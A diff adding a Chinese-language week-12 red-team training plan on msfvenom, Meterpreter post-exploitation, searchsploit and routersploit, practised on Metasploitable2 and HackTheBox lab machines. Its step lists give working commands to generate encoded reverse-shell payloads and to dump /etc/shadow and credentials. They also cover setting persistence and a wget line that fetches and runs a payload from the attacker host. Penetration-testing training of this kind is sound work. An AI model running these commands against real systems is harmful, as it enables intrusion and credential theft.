@@ -1,0 +1,367 @@
+================================================================================
+第12周：漏洞利用进阶 (漏洞利用期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+以"Payload定制化生成与高级后渗透"为贯穿案例，学员在上周Metasploit基础之上
+深入掌握msfvenom自定义payload生成、Meterpreter高级功能（权限提升、持久化、
+内网穿透）、searchsploit本地漏洞库搜索、routersploit路由器漏洞利用等进阶技能。
+本阶段属于"漏洞利用期"，强调独立漏洞利用能力和工具链的灵活运用。
+
+【本周学习目标】
+1. 掌握msfvenom的高级用法：跨平台payload生成、编码、格式转换
+2. 熟练使用Meterpreter高级功能：权限提升、凭证获取、持久化、内网代理
+3. 掌握searchsploit本地Exploit-DB搜索技巧和exploit代码的审阅与修改
+4. 了解IoT/路由器安全威胁面，掌握routersploit基础操作
+5. 能够独立完成从信息收集到后渗透的完整漏洞利用链
+6. 能够编写并交付自定义的恶意payload（用于授权渗透测试）
+7. 理解不同平台（Windows/Linux/Web）漏洞利用的特点和差异
+
+【本周知识清单】
+★ msfvenom Payload高级生成
+  - msfvenom命令行参数全解析：-p, -f, -e, -a, -o, --platform, --arch
+  - Payload类型选择：OS shell、Meterpreter、VNC注入、命令执行
+  - 输出格式：exe, elf, msi, dll, asp, jsp, war, python, powershell, bash
+  - 编码器选择与使用：x86/shikata_ga_nai, cmd/powershell_base64, x86/call4_dword_xor
+  - 多编码迭代：-i 参数设置编码次数
+  - 空指令(NOP)填充和大小控制
+  - 平台与架构匹配：windows/x86, linux/x64, android/armle
+
+★ Meterpreter高级功能
+  - 权限提升模块：getsystem (命名管道模拟), exploit/suggester, bypassuac
+  - 凭证获取：hashdump, kiwi(mimikatz), credcollect
+  - 持久化机制：persistence, run metsvc, run scheduleme
+  - 内网横向移动：autoroute, portfwd, socks proxy
+  - 文件系统深度操作：search, timestomp
+  - 流量代理和隧道：pivot, route
+  - 屏幕截图与键盘记录：screenshot, keyscan_start
+  - 注册表操作（Windows）：reg命令组
+
+★ searchsploit与Exploit-DB
+  - Exploit-DB数据库结构（/usr/share/exploitdb/）
+  - searchsploit基础命令：-t(标题), -p(路径), -m(镜像), -w(URL)
+  - 按平台搜索：--platform linux, --platform windows
+  - 漏洞利用代码的审阅、编译和修改
+  - 本地exploit与远程exploit的区别
+  - searchsploit与Metasploit的互补使用
+
+★ routersploit (rsf)
+  - IoT/路由器安全概述：固件漏洞、默认凭证、CSRF、命令注入
+  - routersploit框架架构：类似MSF的模块化设计
+  - 扫描模块：autopwn, creds/cameras, scanners/
+  - 利用模块：exploits/routers/, exploits/cameras/
+  - 凭证模块：creds/通用默认用户名密码
+  - 与Metasploit的异同和使用场景
+
+【本周工具清单】
+  - msfvenom (Payload生成器)
+  - Metasploit Framework (msfconsole)
+  - searchsploit (Exploit-DB本地搜索)
+  - routersploit (rsfconsole)
+  - ArchStrike Linux
+
+================================================================================
+周一：msfvenom Payload生成
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：msfvenom架构、命令参数和payload生成原理
+  - msfvenom概述：Metasploit的统一payload生成工具
+  - msfvenom = msfpayload + msfencode (2015年整合)
+  - 工作流程：选择payload -> 设置payload参数 -> 选择输出格式 -> 编码 -> 生成
+  - 关键参数详解：
+    * -p, --payload：指定要使用的payload模块
+    * -f, --format：输出格式（exe, elf, raw, python, c, powershell等）
+    * -e, --encoder：选择编码器（绕过AV/IDS）
+    * -a, --arch：目标架构（x86, x64, armle, mipsle等）
+    * --platform：目标平台（windows, linux, android, osx等）
+    * -i, --iterations：编码迭代次数
+    * -b, --bad-chars：指定坏字符（避免payload中出现被过滤的字符）
+    * -n, --nopsled：指定NOP sled长度
+    * -x, --template：使用模板可执行文件
+    * -k, --keep：保留模板可执行文件的原始功能
+  参考文件：/home/a/成长为一个红队/archstrike-exploit教学/01-漏洞利用框架精通.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：使用msfvenom生成多种类型和格式的payload
+  参考文件：/home/a/成长为一个红队/archstrike-exploit教学/01-漏洞利用框架精通.txt
+
+  操作步骤：
+    Step 1: msfvenom -l payloads | head -50 列出可用payload（前面50个）
+    Step 2: msfvenom -l formats 列出所有支持的输出格式
+    Step 3: msfvenom -l encoders 列出所有编码器
+    Step 4: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o /tmp/payload_linux.elf 生成Linux反向Meterpreter payload
+    Step 5: file /tmp/payload_linux.elf 检查文件类型
+    Step 6: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe -o /tmp/payload_windows.exe 生成Windows反向Meterpreter payload
+    Step 7: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=5555 -f raw -o /tmp/payload_raw.bin 生成原始shellcode
+    Step 8: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f elf -o /tmp/payload_encoded.elf 生成多次编码的Linux payload
+    Step 9: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o /tmp/payload_encoded.exe 生成多次编码的Windows payload
+    Step 10: msfvenom -p linux/x86/exec CMD="id; uname -a" -f elf -o /tmp/exec_payload.elf 生成执行命令的payload
+    Step 11: chmod +x /tmp/exec_payload.elf && /tmp/exec_payload.elf 测试执行命令的payload
+    Step 12: msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f raw -o /tmp/shell.php 生成PHP payload
+    Step 13: msfvenom -p cmd/unix/reverse_bash LHOST=192.168.56.1 LPORT=4444 -f raw 生成Bash反向shell一句话
+    Step 14: msfvenom -p cmd/unix/reverse_python LHOST=192.168.56.1 LPORT=4444 -f raw 生成Python反向shell一句话
+    Step 15: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f c 生成C语言格式的shellcode数组
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周二：Meterpreter高级功能
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：Meterpreter高级后渗透功能的深入理解和应用场景
+  - Meterpreter扩展模块体系：
+    * stdapi（标准API）：文件、网络、进程操作
+    * priv（权限提升）：getsystem、bypassuac
+    * incognito（令牌操作）：假冒用户令牌
+    * kiwi（Mimikatz集成）：凭证转储
+    * extapi（扩展API）：剪贴板、窗口枚举等
+    * sniffer（网络嗅探）：在网络接口捕获流量
+    * espia（屏幕操作）：截图、键盘记录
+  - 权限提升技术链：
+    getsystem（命名管道模拟）-> bypassuac（UAC绕过）-> exploit suggester
+  - 内网横向移动：
+    * route add：添加路由到内网网络
+    * autoroute -s：自动添加通过会话的路由
+    * portfwd：端口转发（本地端口到远程目标）
+    * socks proxy：建立SOCKS代理进行内网探测
+  - 凭证获取链：
+    hashdump -> load kiwi -> creds_all -> lsa_dump_sam
+  - 持久化机制对比：registry/service/scheduled task/wmi
+  参考文件：/home/a/成长为一个红队/archstrike-exploit教学/01-漏洞利用框架精通.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：在Meterpreter会话中练习高级后渗透操作
+  参考文件：/home/a/成长为一个红队/archstrike-exploit教学/01-漏洞利用框架精通.txt
+
+  操作步骤：
+    Step 1: sudo msfconsole 启动Metasploit
+    Step 2: use exploit/multi/handler 启动payload监听器
+    Step 3: set PAYLOAD linux/x86/meterpreter/reverse_tcp 设置payload
+    Step 4: set LHOST 192.168.56.1; set LPORT 4444; exploit -j 后台启动监听
+    Step 5: 在Metasploitable2上运行昨日生成的payload_linux.elf (通过之前获取的shell上传执行)
+    Step 6: 当Meterpreter会话建立后, sessions -i 1 交互
+    Step 7: sysinfo 获取系统详细信息
+    Step 8: getuid 查看当前用户权限
+    Step 9: ps 查看进程列表
+    Step 10: migrate <PID> 迁移到更稳定的进程（如系统进程）
+    Step 11: ifconfig 查看网络接口配置
+    Step 12: route 查看路由表
+    Step 13: ls /home; cat /etc/passwd 浏览文件系统
+    Step 14: download /etc/shadow /tmp/shadow_dump 下载影子文件
+    Step 15: upload /tmp/script.sh /tmp/script.sh 上传文件到目标
+    Step 16: execute -f /bin/bash -i 生成交互式shell
+    Step 17: background 返回msfconsole
+    Step 18: sessions -i 1 重新进入会话，练习shell命令（进入原生shell）
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周三：searchsploit搜索与利用
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：Exploit-DB数据库结构和searchsploit搜索工具的全面掌握
+  - Exploit-DB (Exploit Database)概述：Offensive Security维护的公开漏洞利用库
+  - 数据库路径：/usr/share/exploitdb/ 或 /usr/share/exploit-db/
+  - exploits/目录：按平台分类的漏洞利用代码
+  - shellcodes/目录：各平台的shellcode集合
+  - files.csv：所有条目的CSV索引文件
+  - searchsploit基础选项：
+    * 无参数：常规搜索
+    * -t, --title：仅搜索标题（更快）
+    * -p, --path：显示完整文件路径
+    * -m, --mirror：将exploit复制到当前目录
+    * -w, --www：在浏览器中打开Exploit-DB URL
+    * --exclude：排除特定关键词
+    * -c, --case：区分大小写搜索
+  - exploit代码类型：PoC（概念验证）、RCE（远程代码执行）、LPE（本地提权）、DoS（拒绝服务）
+  - 利用exploit代码的安全注意事项：代码审查、虚拟环境测试
+  参考文件：/home/a/成长为一个红队/archstrike-exploit教学/02-Exploit-DB与SearchSploit使用.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：使用searchsploit搜索漏洞、审阅和修改exploit代码
+  参考文件：/home/a/成长为一个红队/archstrike-exploit教学/02-Exploit-DB与SearchSploit使用.txt
+
+  操作步骤：
+    Step 1: sudo apt update && sudo apt install exploitdb 安装/更新Exploit-DB
+    Step 2: searchsploit -h 查看searchsploit帮助信息
+    Step 3: searchsploit vsftpd 搜索vsftpd相关漏洞利用
+    Step 4: searchsploit -t vsftpd 2.3.4 按标题搜索特定版本
+    Step 5: searchsploit samba | head -20 搜索samba相关exploit
+    Step 6: searchsploit -t samba 3.0 按标题搜索特定版本samba
+    Step 7: searchsploit --exclude="dos" samba 排除DoS类型的exploit
+    Step 8: searchsploit -p 49757 查看特定EDB-ID exploit的完整路径
+    Step 9: searchsploit -m 49757 复制exploit到当前目录
+    Step 10: cat 49757.rb 查看exploit代码内容（如为Metasploit模块格式）
+    Step 11: searchsploit linux kernel | head -20 搜索Linux内核提权exploit
+    Step 12: searchsploit -t "dirty cow" 搜索Dirty COW漏洞
+    Step 13: searchsploit apache 搜索Apache相关漏洞
+    Step 14: searchsploit -w wordpress 查看WordPress exploit的Exploit-DB在线URL
+    Step 15: searchsploit proftpd 1.3.5 搜索特定版本ProFTPD的漏洞
+    Step 16: 对比searchsploit结果和Metasploit中search命令的结果，理解两者的互补性
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周四：routersploit入门
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：路由器/IoT设备安全威胁面和routersploit框架使用
+  - IoT/路由器安全现状：
+    * 默认凭证问题（admin/admin, root/admin等）
+    * 固件中硬编码的后门账号
+    * Web管理界面的CSRF、XSS、命令注入漏洞
+    * Telnet/SSH远程管理服务的弱密码
+    * UPnP、SNMP等网络服务的信息泄露
+  - routersploit (rsf) 框架架构：
+    * scanners/：扫描模块（检测路由器型号和漏洞）
+    * exploits/：利用模块（按品牌分类）
+    * creds/：默认凭证模块
+    * generic/：通用利用（如SSH爆破、Telnet登录）
+    * payloads/：路由器payload（反向shell等）
+    * utils/：实用工具
+  - 路由器品牌覆盖：TP-Link, D-Link, Linksys, Netgear, Cisco, Huawei等
+  - 扫描->识别->搜索漏洞->利用的完整流程
+  参考文件：/home/a/成长为一个红队/archstrike-exploit教学/03-路由器与IoT漏洞利用.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：安装routersploit，学习框架基本操作
+  参考文件：/home/a/成长为一个红队/archstrike-exploit教学/03-路由器与IoT漏洞利用.txt
+
+  操作步骤：
+    Step 1: sudo apt install routersploit 或 git clone https://github.com/threat9/routersploit 安装routersploit
+    Step 2: cd /opt/routersploit && sudo python3 rsf.py 启动routersploit控制台（如路径不同自行调整）
+    Step 3: help 查看所有可用命令
+    Step 4: show scanners 列出所有扫描模块
+    Step 5: show exploits 列出所有利用模块
+    Step 6: show creds 列出所有默认凭证模块
+    Step 7: use scanners/autopwn 选择自动扫描模块
+    Step 8: show options 查看需要配置的参数
+    Step 9: set target 192.168.1.1 （本地路由器IP，如需要替换为实际IP或为演示设为靶机IP）
+    Step 10: run 执行扫描（观察识别了哪些服务和漏洞）
+    Step 11: use creds/routers/ 浏览各个品牌路由器的默认凭证
+    Step 12: use creds/cameras/ 浏览IP摄像头默认凭证
+    Step 13: use exploits/routers/ 浏览路由器漏洞利用模块（按品牌分类）
+    Step 14: show all 显示所有模块列表
+    Step 15: search 192.168.1.1 搜索目标相关的模块（如支持）
+    Step 16: exit 退出routersploit控制台
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周五：漏洞利用综合实战
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：本周知识综合梳理和漏洞利用完整攻击链回顾
+  - 漏洞利用完整攻击链（Kill Chain）：
+    侦察(Recon) -> 武器化(Weaponize) -> 投递(Deliver) -> 利用(Exploit) -> 安装(Install) -> C2(Command & Control) -> 行动(Actions)
+  - msfvenom + Metasploit + searchsploit 工具组合战术：
+    * searchsploit发现漏洞 -> msfvenom生成定制payload -> msfconsole建立监听 -> 投递并触发payload -> Meterpreter后渗透
+  - Payload投递方式总结：
+    * 直接可执行文件下载执行
+    * 通过Web漏洞上传（文件上传漏洞）
+    * 通过命令注入执行
+    * 嵌入文档（Office宏、PDF）
+    * 通过USB Rubber Ducky等物理方式
+  - 本周技能图谱：独立完成一个完整攻击链所需的技术栈
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：综合实战 - 对Metasploitable2执行完整的攻击链
+  操作步骤：
+    Step 1: nmap -sV -sC -O -p- 192.168.56.101 完整端口扫描
+    Step 2: 分析扫描结果：识别FTP(21)、SSH(22)、Telnet(23)、SMTP(25)、HTTP(80)、SMB(445)、MySQL(3306)等服务
+    Step 3: searchsploit proftpd 搜索FTP服务漏洞
+    Step 4: searchsploit distcc 搜索distcc服务漏洞
+    Step 5: sudo msfconsole 启动Metasploit
+    Step 6: workspace -a week12_final 创建本周实战工作区
+    Step 7: use exploit/unix/misc/distcc_exec 选择distcc漏洞
+    Step 8: set RHOSTS 192.168.56.101; set PAYLOAD cmd/unix/reverse; set LHOST 192.168.56.1
+    Step 9: exploit 获取初始shell
+    Step 10: 在shell中执行 whoami; id; uname -a; ls -la /home
+    Step 11: background 将shell放入后台
+    Step 12: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=5555 -f elf -o /tmp/msf_linux.elf 生成Meterpreter payload
+    Step 13: use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.56.1; set LPORT 5555; exploit -j
+    Step 14: sessions -i 1 回到之前的shell
+    Step 15: wget http://192.168.56.1:8000/msf_linux.elf -O /tmp/msf && chmod +x /tmp/msf && /tmp/msf 下载并执行Meterpreter payload
+    Step 16: sessions -i 2 切换到Meterpreter会话
+    Step 17: getuid; sysinfo; ps; ifconfig 后渗透收集信息
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周六：复习日 (2h 复习 + 1h HTB Easy Box)
+================================================================================
+
+📝 第1小时 | 周知识点回顾 (08:00 - 09:00)
+  复习清单：
+  - msfvenom命令参数默写：-p -f -e -a -i -b --platform
+  - 至少5种输出格式和对应场景：exe(Windows投放)、elf(Linux投放)、raw(嵌入代码)、python(Python脚本)、powershell(WinRM/PSRemoting)
+  - Meterpreter后渗透命令链：getuid -> ps -> migrate -> getsystem -> hashdump
+  - searchsploit搜索技巧回顾：-t标题搜索、-p路径显示、-m镜像复制、-w在线查看
+
+💻 第2小时 | 靶机独立渗透挑战 (09:00 - 10:00)
+  练习内容：不使用任何外部参考，独立渗透Metasploitable2的3个以上服务
+  操作步骤：
+    Step 1: 从信息收集开始独立操作
+    Step 2: 至少利用3个不同服务获取shell
+    Step 3: 在每个shell中尝试升级为Meterpreter
+    Step 4: 记录每个漏洞利用的具体步骤和命令
+    Step 5: 对比不同漏洞利用方式的便捷性和隐蔽性
+
+🔓 第3小时 | HackTheBox Easy Box (10:00 - 11:00)
+  练习内容：尝试HTB平台上的Easy级别靶机（如Lame、Blue、Legacy、Devel等）
+  操作步骤：
+    Step 1: 连接HTB VPN
+    Step 2: 选择一台Easy级别退役靶机
+    Step 3: nmap扫描 -> 服务识别 -> 漏洞搜索 -> 漏洞利用
+    Step 4: 使用msfconsole或searchsploit搜索已知漏洞
+    Step 5: 获取user.txt和root.txt flag
+    Step 6: 阅读HTB官方Writeup对比自己的攻击路径
+
+================================================================================
+周日：休息日
+================================================================================
+
+【本周资源清单】
+理论知识文件：
+  /home/a/成长为一个红队/archstrike-exploit教学/01-漏洞利用框架精通.txt
+  /home/a/成长为一个红队/archstrike-exploit教学/02-Exploit-DB与SearchSploit使用.txt
+  /home/a/成长为一个红队/archstrike-exploit教学/03-路由器与IoT漏洞利用.txt
+
+实践教程文件：
+  /home/a/成长为一个红队/archstrike-exploit教学/01-漏洞利用框架精通.txt
+  /home/a/成长为一个红队/archstrike-exploit教学/02-Exploit-DB与SearchSploit使用.txt
+  /home/a/成长为一个红队/archstrike-exploit教学/03-路由器与IoT漏洞利用.txt
+
+在线练习：
+  - HackTheBox Easy Boxes (Lame, Blue, Legacy, Devel, Optimum)
+  - Metasploitable2 靶机 (192.168.56.101的各种服务)
+  - Exploit-DB在线 (https://www.exploit-db.com/)
+
+推荐工具安装：
+  - searchsploit (sudo apt install exploitdb)
+  - routersploit (git clone https://github.com/threat9/routersploit)
+  - msfvenom (随Metasploit Framework安装)
+
+【本周完成检查】
+[ ] 周一 [ ] 周二 [ ] 周三 [ ] 周四 [ ] 周五
+[ ] 周六复习 [ ] 笔记 [ ] 体能
